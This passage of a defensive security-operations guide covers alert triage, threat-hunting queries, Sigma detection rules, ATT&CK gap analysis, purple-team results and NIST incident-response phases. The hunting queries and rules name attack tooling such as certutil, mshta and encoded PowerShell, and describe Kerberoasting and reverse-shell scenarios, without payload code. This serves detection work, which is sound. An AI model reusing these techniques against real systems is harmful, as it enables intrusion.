+-------------------------------------------------------------------+
|                                                                     |
|  1. Internal SOC (Build)        2. Outsourced MSSP (Buy)           |
|  +------------------------+     +------------------------+         |
|  | Full control           |     | 24/7 coverage          |         |
|  | Deep org knowledge     |     | Lower initial cost     |         |
|  | Higher TCO             |     | Less org context       |         |
|  | Talent retention risk  |     | Vendor lock-in risk    |         |
|  +------------------------+     +------------------------+         |
|                                                                     |
|  3. Hybrid (Build + Partner)    4. Virtual SOC (Distributed)       |
|  +------------------------+     +------------------------+         |
|  | L1/L2 outsourced       |     | Part-time staff        |         |
|  | L3 + hunting internal  |     | Automated triage       |         |
|  | Best of both worlds    |     | SOAR-heavy             |         |
|  | Complex governance     |     | Suitable for SMB       |         |
|  +------------------------+     +------------------------+         |
+-------------------------------------------------------------------+
```

### 1.3 Alert Fatigue Reduction Strategies

Alert fatigue is the single largest operational challenge in modern SOCs. Industry data shows that analysts who experience chronic alert fatigue miss up to 30% of genuine threats.

#### Root Causes of Alert Fatigue

```
Alert Fatigue Root Causes
├── Detection Rule Issues
│   ├── Overly broad rules (e.g., "any failed login" without context)
│   ├── Stale rules (threats evolved, rules didn't)
│   ├── Duplicate rules across tools
│   └── No risk-based scoring
├── Data Quality Issues
│   ├── Missing context (no asset criticality, no user context)
│   ├── Incomplete normalization (same event, different formats)
│   ├── No threat intelligence enrichment
│   └── Noisy data sources (health checks, scanners)
├── Process Issues
│   ├── No feedback loop (analysts close alerts, no rule improvement)
│   ├── Missing playbooks (every alert requires ad-hoc investigation)
│   ├── No alert deduplication or grouping
│   └── Unclear escalation criteria
└── Tooling Issues
    ├── No SOAR automation for repetitive tasks
    ├── Too many consoles (context switching)
    ├── Slow query performance (investigation bottleneck)
    └── No analyst workload balancing
```

#### Fatigue Reduction Techniques

**1. Risk-Based Alerting (RBA)**

Instead of alerting on individual events, aggregate risk scores and alert when entities exceed thresholds.

```
# Splunk RBA Example - Risk score aggregation
| tstats summariesonly=true sum(All_Risk.calculated_risk_score) as total_risk
  count as risk_event_count
  values(All_Risk.risk_message) as risk_messages
  values(All_Risk.source) as source_rules
  FROM datamodel=Risk.All_Risk
  WHERE All_Risk.risk_object_type="user"
  BY All_Risk.risk_object
| where total_risk > 75 AND risk_event_count > 3
| sort - total_risk
```

**2. Alert Grouping and Correlation**

```yaml
# Example: Group related alerts into a single incident
correlation_rules:
  - name: "Lateral Movement Campaign"
    window: 1h
    conditions:
      - alert_type: "suspicious_authentication"
        count: ">= 3"
        group_by: source_ip
      - alert_type: "unusual_process_execution"
        count: ">= 1"
        group_by: destination_host
      - alert_type: "network_scan"
        count: ">= 1"
        group_by: source_ip
    correlation_field: source_ip
    output:
      severity: high
      incident_type: "lateral_movement"
      suppress_individual_alerts: true
```

**3. Adaptive Thresholds**

```python
# Python pseudocode: dynamic threshold using z-score
import numpy as np
from datetime import datetime, timedelta

def calculate_adaptive_threshold(metric_values, window_days=30, sensitivity=2.5):
    """
    Calculate adaptive threshold using statistical baseline.

    Args:
        metric_values: Array of historical metric values
        window_days: Baseline calculation window
        sensitivity: Number of standard deviations (z-score threshold)

    Returns:
        threshold: Adaptive threshold value
    """
    baseline = metric_values[-window_days * 24:]  # hourly samples
    mean = np.mean(baseline)
    std = np.std(baseline)

    # Dynamic threshold = mean + (sensitivity * standard_deviation)
    threshold = mean + (sensitivity * std)

    # Account for day-of-week and time-of-day patterns
    current_hour = datetime.now().hour
    current_dow = datetime.now().weekday()

    # Filter baseline to same hour and day-of-week
    contextual_baseline = filter_by_time_context(baseline, current_hour, current_dow)
    if len(contextual_baseline) > 7:  # at least 1 week of same-context data
        contextual_mean = np.mean(contextual_baseline)
        contextual_std = np.std(contextual_baseline)
        threshold = contextual_mean + (sensitivity * contextual_std)

    return max(threshold, mean * 0.1)  # floor at 10% of mean to avoid zero
```

**4. SOAR-Driven Auto-Enrichment and Auto-Close**

```yaml
# SOAR playbook: Auto-enrich and auto-close known benign patterns
playbook:
  name: "Auto-Triage Suspicious Login"
  trigger:
    alert_type: "suspicious_login"
  steps:
    - action: enrich_ip
      input: "{{ alert.source_ip }}"
      outputs:
        - geo_location
        - threat_intel_score
        - vpn_exit_node
        - tor_exit_node

    - action: enrich_user
      input: "{{ alert.username }}"
      outputs:
        - last_10_login_locations
        - normal_working_hours
        - mfa_status
        - risk_score

    - decision: auto_close_check
      conditions:
        # Auto-close: known corporate VPN IP + MFA verified + within working hours
        - condition: >
            geo_location in user.known_locations
            AND vpn_exit_node == true
            AND mfa_status == "verified"
            AND current_time in user.normal_working_hours
          action: auto_close
          disposition: "benign_true_positive"
          note: "Corporate VPN login, MFA verified, within normal hours"

        # Auto-close: Known scanner/pentest IP during approved window
        - condition: >
            source_ip in approved_scanner_ips
            AND current_time in approved_scan_window
          action: auto_close
          disposition: "approved_activity"
          note: "Approved vulnerability scan"

        # Escalate: Everything else
        - condition: default
          action: escalate_to_l1
          priority: >
            calculate_priority(
              threat_intel_score,
              user.risk_score,
              asset.criticality
            )
```

### 1.4 Threat Hunting Methodologies

Threat hunting is the proactive, hypothesis-driven search for threats that evade automated detection. Unlike SOC monitoring, which is reactive (alert-driven), hunting assumes the adversary is already inside and seeks evidence of their presence.

#### Three Approaches to Threat Hunting

```
+------------------------------------------------------------------+
|                  Threat Hunting Approaches                         |
+------------------------------------------------------------------+
|                                                                    |
|  1. Hypothesis-Driven          2. IoC-Driven (Intelligence)       |
|  +-----------------------+     +---------------------------+      |
|  | "What if an attacker  |     | "Do we have evidence of   |      |
|  |  is using living-off- |     |  known threat actor TTPs   |      |
|  |  the-land binaries    |     |  from latest CTI report?" |      |
|  |  for persistence?"    |     |                           |      |
|  |                       |     | Input: IoCs (IPs, hashes, |      |
|  | Input: ATT&CK tech-   |     |   domains, registry keys) |      |
|  |   nique, threat model |     | Method: Search historical |      |
|  | Method: Develop and   |     |   logs for IoC matches    |      |
|  |   test hypothesis     |     | Output: Confirmed or      |      |
|  | Output: New detection |     |   denied presence         |      |
|  |   rule or disproven   |     +---------------------------+      |
|  |   hypothesis          |                                        |
|  +-----------------------+     3. Anomaly-Driven (Data-Driven)    |
|                                +---------------------------+      |
|                                | "What doesn't look normal |      |
|                                |  in our environment?"     |      |
|                                |                           |      |
|                                | Input: Baseline behavior  |      |
|                                | Method: Statistical       |      |
|                                |   analysis, ML models,    |      |
|                                |   stack counting, rare    |      |
|                                |   event analysis          |      |
|                                | Output: Anomalies for     |      |
|                                |   further investigation   |      |
|                                +---------------------------+      |
+------------------------------------------------------------------+
```

#### Hypothesis-Driven Hunt Example

```markdown
## Hunt: Living-off-the-Land Persistence via Scheduled Tasks

### Hypothesis
An adversary has established persistence by creating scheduled tasks that execute
LOLBins (certutil, mshta, regsvr32, rundll32, wscript, cscript, msiexec).

### MITRE ATT&CK Mapping
- T1053.005 - Scheduled Task/Job: Scheduled Task
- T1218 - System Binary Proxy Execution (subtechniques vary by LOLBin)
- T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys

### Data Sources Required
- Windows Security Event Log (Event ID 4698 - Scheduled task created)
- Sysmon Event Log (Event ID 1 - Process creation, Event ID 11 - File creation)
- Windows Task Scheduler operational log

### Hunt Queries

# Splunk: Scheduled tasks executing LOLBins
index=windows sourcetype="WinEventLog:Security" EventCode=4698
| rex field=TaskContent "(?i)<Command>(?<task_command>[^<]+)</Command>"
| where match(task_command, "(?i)(certutil|mshta|regsvr32|rundll32|wscript|cscript|msiexec|bitsadmin|powershell.*-enc)")
| stats count values(task_command) as commands values(TaskName) as tasks by Computer, SubjectUserName
| where count > 0

# Elastic/KQL: Same hunt in Elastic Security
event.code: "4698" AND
winlog.event_data.TaskContent: (*certutil* OR *mshta* OR *regsvr32* OR
  *rundll32* OR *wscript* OR *cscript* OR *msiexec* OR *bitsadmin* OR
  *powershell*-enc*)

# Kusto (Microsoft Sentinel):
SecurityEvent
| where EventID == 4698
| extend TaskXml = parse_xml(EventData)
| extend TaskContent = tostring(TaskXml.EventData.Data[0]["#text"])
| where TaskContent matches regex @"(?i)(certutil|mshta|regsvr32|rundll32|wscript|cscript|msiexec)"
| project TimeGenerated, Computer, Account, TaskContent

### Expected Outcomes
- If LOLBin-based scheduled tasks found: Investigate creator account, task creation
  time, command arguments, and what the task downloads/executes.
- If none found: Hypothesis disproven for this technique; document and move on.
- Either way: Convert successful hunt into automated detection rule.
```

#### Anomaly-Driven Hunt: Stack Counting

```
# Stack counting: Find rare values in common fields
# Concept: In a large environment, most things are common.
# The rare items deserve investigation.

# Splunk: Rare processes across all endpoints
index=sysmon EventCode=1
| stats count dc(Computer) as host_count by process_path
| where count < 5 AND host_count == 1
| sort count
| head 50

# Elastic: Rare parent-child process relationships
GET _search
{
  "size": 0,
  "query": {
    "bool": {
      "filter": [
        { "term": { "event.category": "process" }},
        { "range": { "@timestamp": { "gte": "now-7d" }}}
      ]
    }
  },
  "aggs": {
    "parent_child": {
      "composite": {
        "size": 10000,
        "sources": [
          { "parent": { "terms": { "field": "process.parent.name" }}},
          { "child": { "terms": { "field": "process.name" }}}
        ]
      },
      "aggs": {
        "host_count": {
          "cardinality": { "field": "host.name" }
        },
        "rare_filter": {
          "bucket_selector": {
            "buckets_path": { "count": "_count", "hosts": "host_count" },
            "script": "params.count < 3 && params.hosts == 1"
          }
        }
      }
    }
  }
}
```

### 1.5 Detection-as-Code

Detection-as-Code (DaC) applies software engineering practices to security detection rule development: version control, code review, testing, CI/CD, and automated deployment.

#### Detection-as-Code Framework

```
+------------------------------------------------------------------+
|              Detection-as-Code Lifecycle                           |
+------------------------------------------------------------------+
|                                                                    |
|  1. Develop         2. Test           3. Review                   |
|  +------------+     +------------+    +------------+              |
|  | Write rule |     | Unit tests |    | Peer review|              |
|  | in YAML/   |---->| (known     |--->| via PR/MR  |              |
|  | TOML/Sigma |     |  samples)  |    | process    |              |
|  +------------+     +------------+    +------------+              |
|                                             |                      |
|                                             v                      |
|  6. Monitor         5. Deploy          4. Validate                |
|  +------------+     +------------+    +------------+              |
|  | Track FP/TP|<----| CI/CD push |<---| Integration|              |
|  | rates,     |     | to SIEM/   |    | test in    |              |
|  | tune rules |     | detection  |    | staging    |              |
|  +------------+     | platform   |    | SIEM       |              |
|                     +------------+    +------------+              |
+------------------------------------------------------------------+
```

#### Sigma Rule Format (Vendor-Agnostic Detection)

```yaml
# Sigma rule: Detect Kerberoasting activity
title: Kerberos Service Ticket Request for Service Account
id: 3e512f89-2c5a-4b3d-8c14-a7e5d12ab234
status: production
level: high
description: |
  Detects potential Kerberoasting by identifying TGS requests for
  service accounts with SPNs using weak encryption (RC4).
references:
  - https://attack.mitre.org/techniques/T1558/003/
author: Detection Engineering Team
date: 2024/12/15
modified: 2025/01/20
tags:
  - attack.credential_access
  - attack.t1558.003
  - cve.none
logsource:
  product: windows
  service: security
  definition: "Requires Event ID 4769 with Ticket Encryption Type logging enabled"
detection:
  selection:
    EventID: 4769
    TicketEncryptionType: '0x17'  # RC4-HMAC (weak, preferred by attackers)
    Status: '0x0'  # Success
  filter_machine_accounts:
    ServiceName|endswith: '$'  # Exclude machine accounts
  filter_krbtgt:
    ServiceName: 'krbtgt'  # Exclude normal TGT renewals
  condition: selection and not (filter_machine_accounts or filter_krbtgt)
falsepositives:
  - Legacy applications that still require RC4 encryption
  - Service accounts with weak Kerberos configuration
fields:
  - ServiceName
  - TargetUserName
  - IpAddress
  - TicketEncryptionType
enrichment:
  - type: lookup
    source: service_account_inventory
    key: ServiceName
    fields: [owner, criticality, last_password_change]
response:
  - type: notification
    channel: soc-high-priority
  - type: soar_playbook
    name: kerberoasting_investigation
```

#### CI/CD Pipeline for Detections

```yaml
# .github/workflows/detection-pipeline.yaml
name: Detection Rule CI/CD

on:
  pull_request:
    paths:
      - 'detections/**'
  push:
    branches: [main]
    paths:
      - 'detections/**'

jobs:
  validate:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Validate Sigma rules
        run: |
          pip install sigma-cli
          # Validate all Sigma rules for syntax
          sigma check detections/sigma/ --fail-on-error

      - name: Lint YAML
        run: |
          pip install yamllint
          yamllint -c .yamllint.yml detections/

      - name: Check required fields
        run: |
          python scripts/validate_detections.py \
            --required-fields "title,id,level,description,tags,logsource,detection" \
            --required-tags "attack.*" \
            --directory detections/sigma/

  test:
    runs-on: ubuntu-latest
    needs: validate
    steps:
      - uses: actions/checkout@v4

      - name: Run detection tests
        run: |
          # Each detection rule has a corresponding test file
          # with known-true and known-false log samples
          python scripts/test_detections.py \
            --rules-dir detections/sigma/ \
            --tests-dir tests/detection_tests/ \
            --backend splunk \
            --report-file test_results.json

      - name: Check test coverage
        run: |
          python scripts/check_coverage.py \
            --rules-dir detections/sigma/ \
            --tests-dir tests/detection_tests/ \
            --min-coverage 80  # At least 80% of rules must have tests

      - name: Validate MITRE ATT&CK mappings
        run: |
          python scripts/validate_mitre.py \
            --rules-dir detections/sigma/ \
            --attack-version 15.1

  deploy-staging:
    runs-on: ubuntu-latest
    needs: test
    if: github.event_name == 'pull_request'
    steps:
      - name: Convert to SIEM format
        run: |
          sigma convert -t splunk -p sysmon detections/sigma/*.yml \
            --output staging_rules/

      - name: Deploy to staging SIEM
        run: |
          python scripts/deploy_to_siem.py \
            --environment staging \
            --rules-dir staging_rules/ \
            --siem-url ${{ secrets.STAGING_SIEM_URL }} \
            --api-key ${{ secrets.STAGING_SIEM_API_KEY }}

  deploy-production:
    runs-on: ubuntu-latest
    needs: test
    if: github.ref == 'refs/heads/main'
    steps:
      - name: Convert and deploy to production SIEM
        run: |
          sigma convert -t splunk -p sysmon detections/sigma/*.yml \
            --output production_rules/

          python scripts/deploy_to_siem.py \
            --environment production \
            --rules-dir production_rules/ \
            --siem-url ${{ secrets.PROD_SIEM_URL }} \
            --api-key ${{ secrets.PROD_SIEM_API_KEY }} \
            --canary-period 24h  # Monitor for 24h before full activation
```

### 1.6 MITRE ATT&CK Coverage Mapping and Gap Analysis

#### ATT&CK Coverage Heat Map Approach

```python
# Generate MITRE ATT&CK coverage report from detection rules
import json
import yaml
from pathlib import Path
from collections import defaultdict

# ATT&CK Enterprise Matrix - Top Techniques by Prevalence (2024-2025)
# Based on MITRE Center for Threat-Informed Defense "Top ATT&CK Techniques" project
TOP_TECHNIQUES = {
    "T1059": {"name": "Command and Scripting Interpreter", "prevalence": "critical"},
    "T1059.001": {"name": "PowerShell", "prevalence": "critical"},
    "T1059.003": {"name": "Windows Command Shell", "prevalence": "critical"},
    "T1053.005": {"name": "Scheduled Task", "prevalence": "high"},
    "T1547.001": {"name": "Registry Run Keys", "prevalence": "high"},
    "T1078": {"name": "Valid Accounts", "prevalence": "critical"},
    "T1078.004": {"name": "Cloud Accounts", "prevalence": "high"},
    "T1021.001": {"name": "Remote Desktop Protocol", "prevalence": "high"},
    "T1021.006": {"name": "Windows Remote Management", "prevalence": "medium"},
    "T1036": {"name": "Masquerading", "prevalence": "high"},
    "T1055": {"name": "Process Injection", "prevalence": "high"},
    "T1070.004": {"name": "File Deletion", "prevalence": "high"},
    "T1071.001": {"name": "Web Protocols (C2)", "prevalence": "critical"},
    "T1486": {"name": "Data Encrypted for Impact", "prevalence": "critical"},
    "T1566.001": {"name": "Spearphishing Attachment", "prevalence": "critical"},
    "T1566.002": {"name": "Spearphishing Link", "prevalence": "critical"},
    "T1190": {"name": "Exploit Public-Facing Application", "prevalence": "critical"},
    "T1204.001": {"name": "Malicious Link", "prevalence": "high"},
    "T1204.002": {"name": "Malicious File", "prevalence": "high"},
    "T1110": {"name": "Brute Force", "prevalence": "high"},
    "T1558.003": {"name": "Kerberoasting", "prevalence": "high"},
    "T1003.001": {"name": "LSASS Memory", "prevalence": "critical"},
    "T1048": {"name": "Exfiltration Over Alternative Protocol", "prevalence": "high"},
    "T1567": {"name": "Exfiltration Over Web Service", "prevalence": "high"},
}

def analyze_detection_coverage(rules_dir: str) -> dict:
    """Analyze MITRE ATT&CK coverage from Sigma rules."""
    coverage = defaultdict(list)

    for rule_file in Path(rules_dir).glob("**/*.yml"):
        with open(rule_file) as f:
            rule = yaml.safe_load(f)

        tags = rule.get("tags", [])
        for tag in tags:
            if tag.startswith("attack.t"):
                technique_id = tag.replace("attack.", "").upper()
                coverage[technique_id].append({
                    "rule_id": rule.get("id"),
                    "title": rule.get("title"),
                    "level": rule.get("level"),
                    "file": str(rule_file)
                })

    return coverage

def generate_gap_report(coverage: dict) -> dict:
    """Generate gap analysis against top techniques."""
    report = {
        "covered": [],
        "gaps": [],
        "coverage_percentage": 0,
        "critical_gaps": [],
        "recommendations": []
    }

    for tech_id, tech_info in TOP_TECHNIQUES.items():
        if tech_id in coverage:
            report["covered"].append({
                "technique": tech_id,
                "name": tech_info["name"],
                "rule_count": len(coverage[tech_id]),
                "rules": coverage[tech_id]
            })
        else:
            gap = {
                "technique": tech_id,
                "name": tech_info["name"],
                "prevalence": tech_info["prevalence"]
            }
            report["gaps"].append(gap)
            if tech_info["prevalence"] == "critical":
                report["critical_gaps"].append(gap)

    total = len(TOP_TECHNIQUES)
    covered = len(report["covered"])
    report["coverage_percentage"] = round((covered / total) * 100, 1)

    # Generate prioritized recommendations
    for gap in sorted(report["critical_gaps"], key=lambda x: x["prevalence"]):
        report["recommendations"].append(
            f"CRITICAL: Develop detection for {gap['technique']} - {gap['name']}"
        )

    return report
```

#### ATT&CK Coverage Visualization (Navigator Layer)

```json
{
  "name": "SOC Detection Coverage",
  "versions": {
    "attack": "15.1",
    "navigator": "5.0.1",
    "layer": "4.5"
  },
  "domain": "enterprise-attack",
  "description": "Current SOC detection coverage mapped to MITRE ATT&CK",
  "techniques": [
    {
      "techniqueID": "T1059.001",
      "tactic": "execution",
      "color": "#31a354",
      "comment": "3 Sigma rules, 2 ML models. TPR: 85%",
      "score": 90,
      "metadata": [
        {"name": "rule_count", "value": "3"},
        {"name": "true_positive_rate", "value": "85%"},
        {"name": "last_tuned", "value": "2025-01-15"}
      ]
    },
    {
      "techniqueID": "T1078",
      "tactic": "initial-access",
      "color": "#fdae6b",
      "comment": "1 rule, limited to on-prem AD. No cloud coverage.",
      "score": 40,
      "metadata": [
        {"name": "rule_count", "value": "1"},
        {"name": "gap", "value": "cloud identity providers not covered"},
        {"name": "priority", "value": "high"}
      ]
    },
    {
      "techniqueID": "T1190",
      "tactic": "initial-access",
      "color": "#de2d26",
      "comment": "NO COVERAGE. Critical gap.",
      "score": 0,
      "metadata": [
        {"name": "rule_count", "value": "0"},
        {"name": "priority", "value": "critical"},
        {"name": "recommended_data_source", "value": "WAF logs, IDS/IPS, application logs"}
      ]
    }
  ],
  "gradient": {
    "colors": ["#de2d26", "#fdae6b", "#31a354"],
    "minValue": 0,
    "maxValue": 100
  },
  "legendItems": [
    {"label": "No Coverage (0)", "color": "#de2d26"},
    {"label": "Partial Coverage (1-60)", "color": "#fdae6b"},
    {"label": "Good Coverage (61-100)", "color": "#31a354"}
  ]
}
```

### 1.7 Purple Team Exercises

Purple teaming combines offensive (Red) and defensive (Blue) teams working together to test and improve detection capabilities in a collaborative, iterative process.

#### Purple Team Exercise Framework

```
Purple Team Exercise Structure
================================

Phase 1: Planning (1-2 weeks before)
├── Select MITRE ATT&CK techniques to test (typically 5-10 per exercise)
├── Define scope (which systems, networks, time windows)
├── Prepare Red Team attack chains
├── Blue Team documents current detection expectations
└── Establish communication channels and safety protocols

Phase 2: Execution (1-3 days)
├── Red Team executes technique
├── Blue Team observes in real-time (or near-real-time)
├── Document: Was the activity detected? By which tool? How long?
├── If not detected: Red Team reveals exact technique and artifacts
├── Blue Team develops/tunes detection on the spot
└── Re-test technique to confirm new detection works

Phase 3: Reporting (1 week after)
├── Technique-by-technique results matrix
├── Detection gap analysis
├── New/modified detection rules created
├── Recommended data source additions
├── Updated MITRE ATT&CK coverage map
└── Lessons learned and process improvements
```

#### Purple Team Results Tracking

```yaml
# Purple team exercise results format
exercise:
  id: "PT-2025-Q1-003"
  date: "2025-01-15"
  duration: "2 days"
  scope: "Corporate Active Directory environment + AWS production"
  red_team: "Internal Red Team + External Contractor"
  blue_team: "SOC L2/L3 + Detection Engineering"

techniques_tested:
  - technique_id: "T1059.001"
    technique_name: "PowerShell"
    tactic: "Execution"
    attack_scenario: "Encoded PowerShell reverse shell via phishing macro"
    tools_used: ["Cobalt Strike", "custom PowerShell payload"]

    detection_results:
      initial_detection: true
      detected_by: ["Sysmon EventID 1", "Microsoft Defender for Endpoint"]
      time_to_detect: "45 seconds"
      siem_alert_fired: true
      alert_name: "Suspicious Encoded PowerShell Execution"
      false_positive_potential: "low"

    improvements_made:
      - "Added detection for PowerShell -EncodedCommand with base64 > 500 chars"
      - "Created correlation rule: macro execution -> PowerShell -> network connection"

    post_improvement_detection: true
    post_improvement_time: "12 seconds"

  - technique_id: "T1078.004"
    technique_name: "Cloud Accounts"
    tactic: "Initial Access"
    attack_scenario: "Compromised AWS IAM keys used from anomalous location"
    tools_used: ["Pacu (AWS exploitation framework)"]

    detection_results:
      initial_detection: false  # GAP IDENTIFIED
      detected_by: []
      time_to_detect: "N/A - not detected"
      siem_alert_fired: false
      gap_analysis: |
        CloudTrail logs were ingested but no detection rule existed for
        IAM key usage from new geographic location. GuardDuty was not
        enabled in the affected region.

    improvements_made:
      - "Enabled GuardDuty in all active AWS regions"
      - "Created Sigma rule: IAM API calls from previously unseen source IP/region"
      - "Added CloudTrail UserIdentity.accessKeyId to entity analytics baseline"

    post_improvement_detection: true
    post_improvement_time: "2 minutes"

summary:
  techniques_tested: 8
  initially_detected: 5
  detection_rate_before: "62.5%"
  detection_rate_after: "100%"
  new_rules_created: 6
  rules_tuned: 3
  data_sources_added: 2
  mean_detection_time_before: "4.2 minutes"
  mean_detection_time_after: "1.1 minutes"
```

---

## 2. Incident Response Observability

### 2.1 NIST SP 800-61 Lifecycle with Observability

NIST Special Publication 800-61 Rev. 2 (Computer Security Incident Handling Guide) defines a four-phase incident response lifecycle. Each phase has specific observability requirements that determine whether an organization can detect, respond to, and recover from security incidents effectively.

```
+-------------------------------------------------------------------+
|              NIST SP 800-61 Incident Response Lifecycle             |
+-------------------------------------------------------------------+
|                                                                     |
|  Phase 1            Phase 2             Phase 3          Phase 4   |
|  PREPARATION  --->  DETECTION &   --->  CONTAINMENT, -> POST-     |
|                     ANALYSIS            ERADICATION,    INCIDENT   |
|                                         RECOVERY        ACTIVITY   |
|                                                                     |
|  Observability:     Observability:      Observability:  Observ.:   |
|  - Baseline data    - Alert correlation - Forensic      - Timeline |
|  - Asset inventory  - Log analysis        preservation   reconstn. |
|  - Threat intel     - Trace analysis    - Impact scope  - Lessons  |
|    feeds            - Metric anomalies    assessment      learned  |
|  - Detection rules  - Timeline build    - Recovery      - Metrics  |
|  - Runbooks         - Triage            - Validation      review   |
+-------------------------------------------------------------------+
```

#### Phase 1: Preparation -- Observability Requirements

```yaml
# Preparation phase observability checklist
preparation:
  data_collection:
    - name: "Centralized log aggregation"
      requirement: "All security-relevant logs forwarded to SIEM within 60 seconds"
      data_sources:
        - "Authentication logs (AD, LDAP, SAML, OIDC)"
        - "Firewall and network device logs"
        - "DNS query logs"
        - "Endpoint detection and response (EDR) telemetry"
        - "Cloud control plane logs (CloudTrail, Activity Log, Audit Log)"
        - "Application access logs"
        - "VPN and remote access logs"
        - "Email gateway logs"
        - "Web proxy/gateway logs"
        - "Database audit logs"
      validation: "Monthly log source inventory audit -- compare expected vs. actual"

    - name: "Baseline behavior profiles"
      requirement: "At least 30 days of baseline data for anomaly detection"
      baselines:
        - "Normal authentication patterns per user (time, location, device)"
        - "Normal network traffic volumes and patterns per segment"
        - "Normal process execution patterns per endpoint role"
        - "Normal API call patterns per service account"
        - "Normal data access patterns per role/user"

    - name: "Asset and identity inventory"
      requirement: "95%+ accuracy, updated within 24 hours of changes"
      inventory:
        - "Hardware assets with criticality ratings"
        - "Software inventory with version tracking"
        - "User accounts mapped to identities (including service accounts)"
        - "Network topology and segmentation map"
        - "Cloud resource inventory (multi-account, multi-region)"
        - "Third-party integrations and API keys"

  detection_readiness:
    - name: "Detection rule coverage"
      requirement: "MITRE ATT&CK coverage >= 40% of applicable techniques"
      validation: "Quarterly purple team exercise"

    - name: "Alerting pipeline health"
      requirement: "End-to-end alert latency < 5 minutes"
      monitoring:
        - "Log ingestion lag monitoring (alert if > 5 min)"
        - "SIEM search performance monitoring"
        - "Alert delivery confirmation"
        - "On-call rotation coverage verification"

  response_readiness:
    - name: "Incident response playbooks"
      requirement: "Documented playbooks for top 10 incident types"
      playbook_types:
        - "Ransomware"
        - "Business Email Compromise"
        - "Data exfiltration"
        - "Insider threat"
        - "Cloud account compromise"
        - "Web application attack"
        - "DDoS"
        - "Supply chain compromise"
        - "Credential stuffing/brute force"
        - "Malware outbreak"

    - name: "Communication plan"
      requirement: "Predefined notification templates and escalation paths"
      components:
        - "Internal stakeholder notification matrix"
        - "Legal and compliance notification triggers"
        - "Regulatory reporting requirements (GDPR 72h, SEC 4 days)"
        - "Customer/partner notification templates"
        - "Law enforcement contact procedures"
```

#### Phase 2: Detection and Analysis -- Observability in Action

```yaml
# Detection and analysis observability workflows
detection_and_analysis:
  alert_triage_workflow:
    step_1_initial_assessment:
      actions:
        - "Verify alert is not a known false positive"
        - "Check alert context: source, destination, user, asset criticality"
        - "Determine initial severity using risk scoring"
      observability_queries:
        splunk: |
          index=notable search_name="{{ alert.rule_name }}"
          src="{{ alert.source }}" OR dest="{{ alert.destination }}"
          | stats count min(_time) as first_seen max(_time) as last_seen
          | eval recurrence=if(count>5, "recurring", "new")

    step_2_scope_assessment:
      actions:
        - "Identify all affected systems using log correlation"
        - "Map user activity timeline across systems"
        - "Check for lateral movement indicators"
      observability_queries:
        user_timeline: |
          index=* user="{{ incident.user }}" earliest=-24h latest=now
          | transaction user maxspan=5m
          | table _time, index, sourcetype, action, src, dest, app
          | sort _time
        lateral_movement_kusto: |
          DeviceNetworkEvents
          | where Timestamp > ago(24h)
          | where DeviceName == "{{ incident.host }}"
          | where RemotePort in (445, 3389, 5985, 5986, 22, 135)
          | summarize ConnectionCount=count(),
              DistinctDests=dcount(RemoteIP),
              Destinations=make_set(RemoteIP)
            by DeviceName, RemotePort
          | where DistinctDests > 3

    step_3_evidence_collection:
      actions:
        - "Preserve volatile evidence (memory, running processes, network connections)"
        - "Capture relevant log windows (before, during, after)"
        - "Document chain of custody"
      observability_requirements:
        - "Log immutability: WORM storage or blockchain-anchored hashes"
        - "Timestamp accuracy: NTP-synced to < 1 second drift"
        - "Log completeness: No gaps in time series data"
        - "Evidence integrity: SHA-256 hash of all exported data"
```

#### Phase 3: Containment, Eradication, and Recovery

```yaml
containment_eradication_recovery:
  containment_strategies:
    short_term:
      actions:
        - "Network isolation (VLAN change, firewall rule, NSG update)"
        - "Account disable/password reset"
        - "Kill malicious processes"
        - "DNS sinkhole for C2 domains"
      observability_validation:
        - "Confirm no outbound traffic from isolated host"
        - "Confirm account lockout in authentication logs"
        - "Verify process termination in EDR telemetry"
        - "Monitor DNS logs for attempted C2 resolution"

    long_term:
      actions:
        - "Patch vulnerable systems"
        - "Rotate all potentially compromised credentials"
        - "Rebuild compromised systems from known-good images"
        - "Update firewall rules / security groups"
      observability_validation:
        - "Vulnerability scan confirms patches applied"
        - "No authentication with old credentials observed"
        - "System integrity checks pass (file hashing, AIDE)"
        - "Network baseline returns to normal"

  eradication_verification:
    checks:
      - name: "Persistence mechanism removal"
        query: |
          index=sysmon host="{{ incident.host }}"
          (EventCode=12 OR EventCode=13)
          registry_path="*\\CurrentVersion\\Run*" OR
          registry_path="*\\Services\\*"
        expected: "Only known-good entries"

      - name: "No active C2 communication"
        query: |
          index=firewall dest_ip IN ({{ incident.c2_ips }})
          OR dest_domain IN ({{ incident.c2_domains }})
          | stats count by src, dest_ip, dest_domain
        expected: "Zero results"

  recovery_monitoring:
    enhanced_monitoring:
      - "Increase log verbosity on affected systems"
      - "Deploy additional network monitoring on affected segments"
      - "Lower detection thresholds for affected users/systems"
      - "Daily review of affected system activity"
    duration: "30-90 days post-incident"
    exit_criteria:
      - "No recurrence of IoCs for 30 days"
      - "All systems pass integrity verification"
      - "Baseline behavior restored"
```

### 2.2 Incident Timeline Reconstruction

Timeline reconstruction combines logs, traces, metrics, and forensic artifacts into a coherent narrative. It is the most critical investigative skill in incident response.

```
Timeline Data Sources
=====================
+------------------+    +------------------+    +------------------+
| System Logs      |    | Network Data     |    | Application Data |
| - Windows Events |    | - Firewall logs  |    | - Access logs    |
| - Linux auth/sys |    | - DNS queries    |    | - API audit logs |
| - Cloud audit    |    | - Proxy logs     |    | - OTel traces    |
+--------+---------+    +--------+---------+    +--------+---------+
         |                       |                        |
         v                       v                        v
+------------------------------------------------------------------+
|                   Unified Timeline Engine                          |
|  1. Normalize timestamps (UTC, microsecond precision)             |
|  2. Correlate events across sources (IP, user, session ID)        |
|  3. Enrich with context (asset info, threat intel, geo)           |
|  4. Sequence events into attack narrative                         |
+------------------------------------------------------------------+
```

#### Multi-Source Timeline Query (Splunk)

```spl
(index=windows host IN ("WORKSTATION01","SERVER02") earliest="2025-01-15T03:00:00"
 latest="2025-01-15T12:00:00")
OR
(index=firewall (src IN ("10.0.1.55","10.0.2.100") OR dest IN ("10.0.1.55","10.0.2.100"))
 earliest="2025-01-15T03:00:00" latest="2025-01-15T12:00:00")
OR
(index=proxy user="jdoe"
 earliest="2025-01-15T03:00:00" latest="2025-01-15T12:00:00")
| eval event_category=case(
    index=="windows" AND EventCode IN (4624,4625,4648), "authentication",
    index=="windows" AND EventCode IN (4688,1), "process_execution",
    index=="firewall", "network_connection",
    index=="proxy", "web_activity",
    1==1, "other")
| table _time, event_category, host, user, src_ip, dest_ip, event_description
| sort _time
```

### 2.3 Digital Forensics and Evidence Preservation

